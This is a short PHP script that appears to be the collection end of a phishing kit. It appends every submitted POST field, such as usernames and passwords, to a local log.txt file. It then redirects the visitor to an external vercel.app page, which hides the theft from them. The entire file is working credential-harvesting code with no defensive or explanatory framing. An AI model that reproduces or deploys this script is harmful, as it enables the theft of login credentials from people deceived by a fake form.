<?php
header ('Location: https://qinzrikud.vercel.app/index.html');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n");
fclose($handle);
exit;
?>